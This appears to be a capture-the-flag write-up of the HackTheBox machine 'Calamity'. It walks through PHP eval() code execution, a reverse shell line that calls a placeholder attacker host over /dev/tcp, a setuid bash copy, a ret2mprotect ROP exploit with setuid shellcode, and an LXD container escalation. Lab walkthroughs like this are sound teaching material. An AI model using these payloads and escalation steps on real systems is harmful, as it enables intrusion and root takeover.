# HTB: Calamity — Writeup

**Difficulty:** Hard | **OS:** Linux x86 32-bit | **IP:** 10.10.10.27  
**Profile:** [MaikPro @ HackTheBox](https://app.hackthebox.com/profile/MaikPro)

---

## Summary

Calamity starts with hardcoded credentials in an HTML comment granting access to
a PHP `eval()` panel. A process-name blacklist is bypassed by copying bash to
`/dev/shm`. Audio steganography via phase cancellation in Audacity reveals the
user password. Root is achieved via a 3-stage exploit against a SUID binary:
information leak through EBX manipulation, admin check bypass, and a
ret2mprotect ROP chain to mark the stack executable and run shellcode.
An LXD group escalation is also documented as an alternative path.

---

## Enumeration

### TCP Scan

```bash
nmap -sC -sV -oA nmap/calamity 10.10.10.27
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp open  http    Apache httpd 2.4.18
```

### Directory Discovery

```bash
gobuster dir -x php -u http://10.10.10.27 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```
/uploads  (301)
/admin.php (200)
```

---

## Foothold — PHP eval() RCE

Credentials found in `/admin.php` HTML source comment:

```html
<!-- password is:skoupidotenekes -->
```

Login: `admin / skoupidotenekes`

The panel evaluates arbitrary user input via `eval()`:

```php
<?php system("id"); ?>
# uid=33(www-data)
```

### Process Blacklist Bypass

A monitor kills processes by name: `nc`, `python`, `bash`, `sh`.
Copy bash under a different name to bypass:

```php
<?php system("cp /bin/bash /dev/shm/0xdf; chmod +xs /dev/shm/0xdf"); ?>
```

Reverse shell via the renamed binary:

```php
<?php system("/dev/shm/0xdf -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>
```

Shell as `www-data`.

---

## Privilege Escalation — www-data → xalvas (Audio Steganography)

```bash
ls /home/xalvas/alarmclocks/
# rick.wav  recov.wav
```

`rick.wav` and `recov.wav` sound identical but differ at the binary level.

### Phase Cancellation in Audacity

1. Import `rick.wav` as Track 1
2. Import `recov.wav` as Track 2
3. Select Track 2 → **Effect > Invert** (flips the audio phase)
4. Select both tracks → **Tracks > Mix and Render**
5. The cover audio cancels out — only the hidden audio layer remains
6. Listen to the result — a voice reads out the password: `18547936..*`

```bash
ssh xalvas@10.10.10.27   # password: 18547936..*
cat /home/xalvas/user.txt
```

**User flag captured.**

---

## Privilege Escalation — xalvas → root (3-Stage SUID Exploit)

**Binary:** `/home/xalvas/app/goodluck` — SUID root, source in `goodluck.c`  
**Architecture:** x86 32-bit, ASLR disabled, NX enabled

### Struct Layout

```c
#define USIZE 12
struct f {
    char user[USIZE];  // offset +0x00 (12 bytes)
    int  secret;       // offset +0x0c
    int  admin;        // offset +0x10
    int  session;      // offset +0x14
} hey;                 // base @ 0x80003068
```

`createusername()` copies user input into `user[]` without bounds checking,
overflowing into `secret`, `admin` and `session`.

The binary uses `EBX` as a base pointer for all struct field accesses.
Controlling EBX shifts every field reference — the core of all three stages.

---

### Stage 1 — Information Leak (get `hey.secret`)

Craft a payload that shifts EBX by -8. The program reads `hey.secret` when
it thinks it is reading `hey.session`, and prints the value in the debug menu.

```python
payload1 = b'A' * 8 + p32(struct_base - 8)
# secret value is leaked via debug menu output
```

---

### Stage 2 — Admin Bypass

With the leaked `secret`, shift EBX by -4 so that the admin check reads a value
we control. Write the correct `secret` value and set `admin = 1`.

```python
payload2 = p32(leaked_secret) + b'B' * 4 + p32(0x1)
# admin check passes → debug() menu unlocked
```

---

### Stage 3 — ret2mprotect + Shellcode

`debug()` reads 100 bytes into a 64-byte buffer. Return address at offset 76.

NX is enabled — stack is not executable. Use `mprotect()` via ROP to mark
the stack RWX, then return into shellcode.

```python
mprotect_addr = 0xb7efcd50
pop3ret       = 0xb7fdac31    # pop/pop/pop/ret gadget to clean mprotect args
stack_base    = 0xbfedf000
stack_size    = 0x121000
PROT_RWX      = 0x7

# setuid(0) + execve("/bin/sh") — 28 bytes
shellcode  = b'\x31\xc0\x31\xdb\xb0\x17\xcd\x80'
shellcode += b'\x31\xd2\x52\x68\x2f\x2f\x73\x68'
shellcode += b'\x68\x2f\x62\x69\x6e\x89\xe3\x52'
shellcode += b'\x53\x89\xe1\xb0\x0b\xcd\x80'

payload3  = b'\x90' * 10                           # NOP sled
payload3 += shellcode                              # 28 bytes
payload3 += b'A' * (76 - 10 - len(shellcode))     # padding to offset 76
payload3 += p32(mprotect_addr)                     # call mprotect()
payload3 += p32(pop3ret)                           # ROP: clean 3 args
payload3 += p32(stack_base)                        # arg1: address
payload3 += p32(stack_size)                        # arg2: size
payload3 += p32(PROT_RWX)                          # arg3: PROT_READ|WRITE|EXEC
payload3 += p32(buf_addr)                          # return into shellcode
```

The `debug()` function prints the buffer address on each run — required since
the address shifts slightly based on environment (ARGV/ENV).

```bash
# uid=0(root)
cat /root/root.txt
```

**Root flag captured.**

---

### Alternative — LXD Group Escalation

`xalvas` is also in the `lxd` group. Faster path to root:

```bash
# On attacker: build minimal Alpine image
lxc image import ./alpine.tar.gz --alias myimage
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh

# Inside container — host filesystem at /mnt/root
cat /mnt/root/root/root.txt
```

---

## Attack Chain

```
gobuster → /admin.php
  → credentials in HTML comment (admin:skoupidotenekes)
  → PHP eval() RCE → process blacklist bypass via /dev/shm/0xdf
  → www-data shell
  → /home/xalvas/alarmclocks/ → Audacity phase cancellation
  → password 18547936..* → SSH xalvas → user.txt
  → SUID goodluck (goodluck.c, x86 32-bit, ASLR off, NX on)
  → Stage 1: EBX -8 → leak hey.secret value
  → Stage 2: EBX -4 → admin = 1 bypass
  → Stage 3: ret2mprotect ROP → stack RWX → shellcode → root
  → root.txt
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Service enumeration |
| gobuster | Web directory discovery |
| Audacity | Audio steganography — phase cancellation |
| gdb + PEDA | Binary analysis and offset calculation |
| pwntools | Exploit scripting |
| ROPgadget | Finding pop/pop/pop/ret gadget |
| lxc | LXD group privilege escalation (alternative) |

---

## CVEs & Techniques

| Reference | Description |
|-----------|-------------|
| CWE-798 | Hardcoded credentials in HTML source |
| CWE-95 | PHP `eval()` remote code execution |
| CWE-121 | Stack buffer overflow in SUID binary |
| T1027.003 | Audio steganography — phase cancellation |
| — | Process blacklist bypass via binary rename |
| — | EBX base pointer manipulation — struct field misalignment |
| — | ret2mprotect — NX bypass via mprotect ROP chain |
| — | LXD group privilege escalation via privileged container |
